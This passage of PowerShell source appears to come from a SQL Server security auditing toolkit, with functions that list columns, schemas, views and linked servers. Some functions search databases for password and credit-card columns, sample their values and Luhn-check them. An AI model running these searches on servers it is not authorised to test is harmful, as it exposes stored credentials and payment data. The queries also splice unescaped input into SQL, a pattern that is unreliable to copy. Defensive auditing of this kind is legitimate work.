        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Column name using wildcards in search.  Supports comma seperated list.')]
        [string]$ColumnNameSearch,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblColumns = New-Object -TypeName System.Data.DataTable

        # Setup table filter
        if($TableName)
        {
            $TableNameFilter = " and TABLE_NAME like '%$TableName%'"
        }
        else
        {
            $TableNameFilter = ''
        }

        # Setup column filter
        if($ColumnName)
        {
            $ColumnFilter = " and column_name like '$ColumnName'"
        }
        else
        {
            $ColumnFilter = ''
        }

        # Setup column filter
        if($ColumnNameSearch)
        {
            $ColumnSearchFilter = " and column_name like '%$ColumnNameSearch%'"
        }
        else
        {
            $ColumnSearchFilter = ''
        }

        # Setup column search filter
        if($ColumnNameSearch)
        {
            $Keywords = $ColumnNameSearch.split(',')

            [int]$i = $Keywords.Count
            while ($i -gt 0)
            {
                $i = $i - 1
                $Keyword = $Keywords[$i]

                if($i -eq ($Keywords.Count -1))
                {
                    $ColumnSearchFilter = "and column_name like '%$Keyword%'"
                }
                else
                {
                    $ColumnSearchFilter = $ColumnSearchFilter + " or column_name like '%$Keyword%'"
                }
            }
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin or DBO privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Setup NoDefault filter
        if($NoDefaults)
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }

        # Get tables for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Get database name
            $DbName = $_.DatabaseName

            # Define Query
            $Query = "  USE $DbName;
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                TABLE_CATALOG AS [DatabaseName],
                TABLE_SCHEMA AS [SchemaName],
                TABLE_NAME as [TableName],
                COLUMN_NAME as [ColumnName],
                DATA_TYPE as [ColumnDataType],
                CHARACTER_MAXIMUM_LENGTH as [ColumnMaxLength]
                FROM	[$DbName].[INFORMATION_SCHEMA].[COLUMNS] WHERE 1=1
                $ColumnSearchFilter
                $ColumnFilter
                $TableNameFilter
            ORDER BY TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME"

            # Execute Query
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose

            # Append results
            $TblColumns = $TblColumns + $TblResults
        }
    }

    End
    {
        # Return data
        $TblColumns
    }
}


# ---------------------------------------
# Get-SQLColumnSampleData
# ---------------------------------------
# Author: Scott Sutherland
Function Get-SQLColumnSampleData
{
    <#
            .SYNOPSIS
            Returns column information from target SQL Servers. Supports search by keywords, sampling data, and validating credit card numbers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER $NoOutput
            Don't output any sample data.
            .PARAMETER SampleSize
            Number of records to sample.
            .PARAMETER Keywords
            Number of records to sample.
            .PARAMETER DatabaseName
            Database to filter on.
            .PARAMETER ValidateCC
            Use Luhn formula to check if sample is a valid credit card.
            Column name filter that support wildcards.
            .PARAMETER NoDefaults
            Don't show columns from default databases.
            .EXAMPLE
            PS C:\> Get-SQLColumnSampleData -verbose -Instance SQLServer1\STANDARDDEV2014 -Keywords "account,credit,card" -SampleSize 5 -ValidateCC| ft -AutoSize
            VERBOSE: SQLServer1\STANDARDDEV2014 : START SEARCH DATA BY COLUMN
            VERBOSE: SQLServer1\STANDARDDEV2014 : CONNECTION SUCCESS
            VERBOSE: SQLServer1\STANDARDDEV2014 : - Searching for column names that match criteria...
            VERBOSE: SQLServer1\STANDARDDEV2014 : - Column match: [testdb].[dbo].[tracking].[card]
            VERBOSE: SQLServer1\STANDARDDEV2014 : - Selecting 5 rows of data sample from column [testdb].[dbo].[tracking].[card].
            VERBOSE: SQLServer1\STANDARDDEV2014 : COMPLETED SEARCH DATA BY COLUMN

            ComputerName   Instance                   Database Schema Table    Column Sample           RowCount IsCC
            ------------   --------                   -------- ------ -----    ------ ------           -------- ----
            SQLServer1     SQLServer1\STANDARDDEV2014 testdb   dbo    tracking card   4111111111111111 2        True
            SQLServer1     SQLServer1\STANDARDDEV2014 testdb   dbo    tracking card   41111111111ASDFD 2        False
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLColumnSampleData -Keywords "account,credit,card" -SampleSize 5 -ValidateCC
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [switch]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of records to sample.')]
        [int]$SampleSize = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Comma seperated list of keywords to search for.')]
        [string]$Keywords = 'Password',

        [Parameter(Mandatory = $false,
        HelpMessage = 'Database name to filter on.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use Luhn formula to check if sample is a valid credit card.')]
        [switch]$ValidateCC,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Database')
        $null = $TblData.Columns.Add('Schema')
        $null = $TblData.Columns.Add('Table')
        $null = $TblData.Columns.Add('Column')
        $null = $TblData.Columns.Add('Sample')
        $null = $TblData.Columns.Add('RowCount')

        if($ValidateCC)
        {
            $null = $TblData.Columns.Add('IsCC')
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : CONNECTION FAILED"
            }
            Return
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : START SEARCH DATA BY COLUMN"
                Write-Verbose -Message "$Instance : - Connection Success."
                Write-Verbose -Message "$Instance : - Searching for column names that match criteria..."
            }

            if($NoDefaults)
            {
                # Search for columns
                $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -ColumnNameSearch $Keywords -NoDefaults -SuppressVerbose
            }else
            {
                $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -ColumnNameSearch $Keywords -SuppressVerbose
            }
        }

        # Check if columns were found
        if($Columns)
        {
            # List columns found
            $Columns|
            ForEach-Object -Process {
                $sDatabaseName = $_.DatabaseName
                $sSchemaName = $_.SchemaName
                $sTableName = $_.TableName
                $sColumnName = $_.ColumnName
                $AffectedColumn = "[$sDatabaseName].[$sSchemaName].[$sTableName].[$sColumnName]"
                $AffectedTable = "[$sDatabaseName].[$sSchemaName].[$sTableName]"
                $Query = "USE $sDatabaseName; SELECT TOP $SampleSize [$sColumnName] FROM $AffectedTable WHERE [$sColumnName] is not null"
                $QueryRowCount = "USE $sDatabaseName; SELECT count(CAST([$sColumnName] as VARCHAR(200))) as NumRows FROM $AffectedTable WHERE [$sColumnName] is not null"

                # Status user
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : - Column match: $AffectedColumn"
                    Write-Verbose -Message "$Instance : - Selecting $SampleSize rows of data sample from column $AffectedColumn."
                }

                # Get row count for column matches
                $RowCount = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $QueryRowCount -SuppressVerbose | Select-Object -Property NumRows -ExpandProperty NumRows

                # Get sample data
                Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $Query -SuppressVerbose |
                Select-Object -ExpandProperty $sColumnName |
                ForEach-Object -Process {
                    if($ValidateCC)
                    {
                        # Check if value is CC
                        $Value = 0
                        if([uint64]::TryParse($_,[ref]$Value))
                        {
                            $LuhnCheck = Test-IsLuhnValid $_ -ErrorAction SilentlyContinue
                        }
                        else
                        {
                            $LuhnCheck = 'False'
                        }

                        # Add record
                        $null = $TblData.Rows.Add($ComputerName, $Instance, $sDatabaseName, $sSchemaName, $sTableName, $sColumnName, $_, $RowCount, $LuhnCheck)
                    }
                    else
                    {
                        # Add record
                        $null = $TblData.Rows.Add($ComputerName, $Instance, $sDatabaseName, $sSchemaName, $sTableName, $sColumnName, $_, $RowCount)
                    }
                }
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : - No columns were found that matched the search."
            }
        }

        # Status User
        if( -not $SuppressVerbose)
        {
            Write-Verbose -Message "$Instance : END SEARCH DATA BY COLUMN"
        }
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


# ---------------------------------------
# Get-SQLColumnSampleDataThreaded
# ---------------------------------------
# Author: Scott Sutherland
Function Get-SQLColumnSampleDataThreaded
{
    <#
            .SYNOPSIS
            Returns column information from target SQL Servers. Supports search by keywords, sampling data, and validating credit card numbers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER $NoOutput
            Don't output any sample data.
            .PARAMETER SampleSize
            Number of records to sample.
            .PARAMETER Keywords
            Comma seperated list of keywords to search for.
            .PARAMETER DatabaseName
            Database to filter on.
            .PARAMETER NoDefaults
            Don't show columns from default databases.
            .PARAMETER ValidateCC
            Use Luhn formula to check if sample is a valid credit card.

            .PARAMETER Threads
            Number of concurrent host threads.
            .EXAMPLE
            PS C:\> Get-SQLColumnSampleDataThreaded -verbose -Instance SQLServer1\STANDARDDEV2014 -Keywords "account,credit,card" -SampleSize 5 -ValidateCC | ft -AutoSize
            VERBOSE: SQLServer1\STANDARDDEV2014 : START SEARCH DATA BY COLUMN
            VERBOSE: SQLServer1\STANDARDDEV2014 : CONNECTION SUCCESS
            VERBOSE: SQLServer1\STANDARDDEV2014 : - Searching for column names that match criteria...
            VERBOSE: SQLServer1\STANDARDDEV2014 : - Column match: [testdb].[dbo].[tracking].[card]
            VERBOSE: SQLServer1\STANDARDDEV2014 : - Selecting 5 rows of data sample from column [testdb].[dbo].[tracking].[card].
            VERBOSE: SQLServer1\STANDARDDEV2014 : COMPLETED SEARCH DATA BY COLUMN

            ComputerName   Instance                   Database Schema Table    Column Sample           RowCount IsCC
            ------------   --------                   -------- ------ -----    ------ ------           -------- ----
            SQLServer1     SQLServer1\STANDARDDEV2014 testdb   dbo    tracking card   4111111111111111 2        True
            SQLServer1     SQLServer1\STANDARDDEV2014 testdb   dbo    tracking card   41111111111ASDFD 2        False
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLColumnSampleDataThreaded -Keywords "account,credit,card" -SampleSize 5 -ValidateCC -Threads 10
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of records to sample.')]
        [int]$SampleSize = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Comma seperated list of keywords to search for.')]
        [string]$Keywords = 'Password',

        [Parameter(Mandatory = $false,
        HelpMessage = 'Database name to filter on.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use Luhn formula to check if sample is a valid credit card.')]
        [switch]$ValidateCC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 5,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Database')
        $null = $TblData.Columns.Add('Schema')
        $null = $TblData.Columns.Add('Table')
        $null = $TblData.Columns.Add('Column')
        $null = $TblData.Columns.Add('Sample')
        $null = $TblData.Columns.Add('RowCount')

        if($ValidateCC)
        {
            $null = $TblData.Columns.Add('IsCC')
        }

        # Setup data table for pipeline threading
        $PipelineItems = New-Object -TypeName System.Data.DataTable

        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Ensure provided instance is processed
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Add instance to instance list
        $PipelineItems = $PipelineItems + $ProvideInstance
    }

    Process
    {
        # Create list of pipeline items
        $PipelineItems = $PipelineItems + $_
    }

    End
    {
        # Define code to be multi-threaded
        $MyScriptBlock = {
            # Set instance
            $Instance = $_.Instance

            # Parse computer name from the instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

            # Default connection to local default instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }

            # Test connection to server
            $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
                $_.Status -eq 'Accessible'
            }
            if(-not $TestConnection)
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : CONNECTION FAILED"
                }
                Return
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : START SEARCH DATA BY COLUMN"
                    Write-Verbose -Message "$Instance : - Connection Success."
                    Write-Verbose -Message "$Instance : - Searching for column names that match criteria..."
                }

                if($NoDefaults)
                {
                    # Search for columns
                    $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -ColumnNameSearch $Keywords -NoDefaults -SuppressVerbose
                }else
                {
                    $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -ColumnNameSearch $Keywords -SuppressVerbose
                }
            }

            # Check if columns were found
            if($Columns)
            {
                # List columns found
                $Columns|
                ForEach-Object -Process {
                    $sDatabaseName = $_.DatabaseName
                    $sSchemaName = $_.SchemaName
                    $sTableName = $_.TableName
                    $sColumnName = $_.ColumnName
                    $AffectedColumn = "[$sDatabaseName].[$sSchemaName].[$sTableName].[$sColumnName]"
                    $AffectedTable = "[$sDatabaseName].[$sSchemaName].[$sTableName]"
                    $Query = "USE $sDatabaseName; SELECT TOP $SampleSize [$sColumnName] FROM $AffectedTable WHERE [$sColumnName] is not null"
                    $QueryRowCount = "USE $sDatabaseName; SELECT count(CAST([$sColumnName] as VARCHAR(200))) as NumRows FROM $AffectedTable WHERE [$sColumnName] is not null"

                    # Status user
                    if( -not $SuppressVerbose)
                    {
                        Write-Verbose -Message "$Instance : - Column match: $AffectedColumn"
                        Write-Verbose -Message "$Instance : - Selecting $SampleSize rows of data sample from column $AffectedColumn."
                    }

                    # Get row count for column matches
                    $RowCount = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $QueryRowCount -SuppressVerbose | Select-Object -Property NumRows -ExpandProperty NumRows

                    # Get sample data
                    Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $Query -SuppressVerbose |
                    Select-Object -ExpandProperty $sColumnName |
                    ForEach-Object -Process {
                        if($ValidateCC)
                        {
                            # Check if value is CC
                            $Value = 0
                            if([uint64]::TryParse($_,[ref]$Value))
                            {
                                $LuhnCheck = Test-IsLuhnValid $_ -ErrorAction SilentlyContinue
                            }
                            else
                            {
                                $LuhnCheck = 'False'
                            }

                            # Add record
                            $null = $TblData.Rows.Add($ComputerName, $Instance, $sDatabaseName, $sSchemaName, $sTableName, $sColumnName, $_, $RowCount, $LuhnCheck)
                        }
                        else
                        {
                            # Add record
                            $null = $TblData.Rows.Add($ComputerName, $Instance, $sDatabaseName, $sSchemaName, $sTableName, $sColumnName, $_, $RowCount)
                        }
                    }
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : - No columns were found that matched the search."
                }
            }

            # Status User
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : END SEARCH DATA BY COLUMN"
            }
        }

        # Run scriptblock using multi-threading
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue

        return $TblData
    }
}


# ----------------------------------
#  Get-SQLDatabaseSchema
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLDatabaseSchema
{
    <#
            .SYNOPSIS
            Returns schema information from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER DatabaseName
            Database name to filter for.
            .PARAMETER SchemaName
            Schema name to filter for.
            .PARAMETER NoDefaults
            Only show information for non default databases.

            .EXAMPLE
            PS C:\> Get-SQLDatabaseSchema -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb

            ComputerName : SQLServer1
            Instance     : SQLServer1\STANDARDDEV2014
            DatabaseName : testdb
            SchemaName   : db_accessadmin
            SchemaOwner  : db_accessadmin
            [TRUNCATED]
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLDatabaseSchema -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Schema name.')]
        [string]$SchemaName,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblSchemas = New-Object -TypeName System.Data.DataTable

        # Setup schema filter
        if($SchemaName)
        {
            $SchemaNameFilter = " where schema_name like '%$SchemaName%'"
        }
        else
        {
            $SchemaNameFilter = ''
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Setup NoDefault filter
        if($NoDefaults)
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }

        # Get tables for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Get database name
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Grabbing Schemas from the $DbName database..."
            }

            # Define Query
            $Query = "  USE $DbName;
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                CATALOG_NAME as [DatabaseName],
                SCHEMA_NAME as [SchemaName],
                SCHEMA_OWNER as [SchemaOwner]
                FROM    [$DbName].[INFORMATION_SCHEMA].[SCHEMATA]
                $SchemaNameFilter
            ORDER BY SCHEMA_NAME"

            # Execute Query
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose

            # Append results
            $TblSchemas = $TblSchemas + $TblResults
        }
    }

    End
    {
        # Return data
        $TblSchemas
    }
}


# ----------------------------------
#  Get-SQLView
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLView
{
    <#
            .SYNOPSIS
            Returns view information from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DatabaseName
            Database name to filter for.
            .PARAMETER ViewName
            View name to filter for.
            .PARAMETER NoDefaults
            Only display results from non default databases.
            .EXAMPLE
            PS C:\> Get-SQLView -Instance SQLServer1\STANDARDDEV2014 -DatabaseName master

            ComputerName   : SQLServer1
            Instance       : SQLServer1\STANDARDDEV2014
            DatabaseName   : master
            SchemaName     : dbo
            ViewName       : spt_values
            ViewDefinition :
            create view spt_values as
            select name collate database_default as name,
            number,
            type collate database_default as type,
            low, high, status
            from sys.spt_values
            IsUpdatable    : NO
            CheckOption    : NONE
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLView -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'View name.')]
        [string]$ViewName,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblViews = New-Object -TypeName System.Data.DataTable

        # Setup View filter
        if($ViewName)
        {
            $ViewFilter = " where table_name like '%$ViewName%'"
        }
        else
        {
            $ViewFilter = ''
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Grabbing views from the databases below:"
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Setup NoDefault filter
        if($NoDefaults)
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }

        # Get tables for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Get database name
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : - $DbName"
            }

            # Define Query
            $Query = "  USE $DbName;
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                TABLE_CATALOG as [DatabaseName],
                TABLE_SCHEMA as [SchemaName],
                TABLE_NAME as [ViewName],
                VIEW_DEFINITION as [ViewDefinition],
                IS_UPDATABLE as [IsUpdatable],
                CHECK_OPTION as [CheckOption]
                FROM    [INFORMATION_SCHEMA].[VIEWS]
                $ViewFilter
            ORDER BY TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME"

            # Execute Query
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Append results
            $TblViews = $TblViews + $TblResults
        }
    }

    End
    {
        # Return data
        $TblViews
    }
}


# ----------------------------------
#  Get-SQLServerLink
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLServerLink
{
    <#
            .SYNOPSIS
            Returns link servers from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DatabaseLinkName
            Database link name to filter for.
            .EXAMPLE
            PS C:\> Get-SQLServerLink -Instance SQLServer1\STANDARDDEV2014

            ComputerName           : SQLServer1
            Instance               : SQLServer1\STANDARDDEV2014
            DatabaseLinkId         : 0
            DatabaseLinkName       : SQLServer1\STANDARDDEV2014
            DatabaseLinkLocation   : Local
            Product                : SQL Server
            Provider               : SQLNCLI
            Catalog                :
            Local Login            : Uses Self Credentials
            RemoteLoginName        :
            is_rpc_out_enabled     : True
            is_data_access_enabled : False
            modify_date            : 3/13/2016 12:30:33 PM

            ComputerName           : SQLServer1
            Instance               : SQLServer1\STANDARDDEV2014
            DatabaseLinkId         : 1
            DatabaseLinkName       : SQLServer2\SQLEXPRESS
            DatabaseLinkLocation   : Remote
            Product                : SQL Server
            Provider               : SQLNCLI
            Catalog                :
            Local Login            :
            RemoteLoginName        : user123
            is_rpc_out_enabled     : False
            is_data_access_enabled : True
            modify_date            : 5/6/2016 10:20:44 AM
            .EXAMPLE
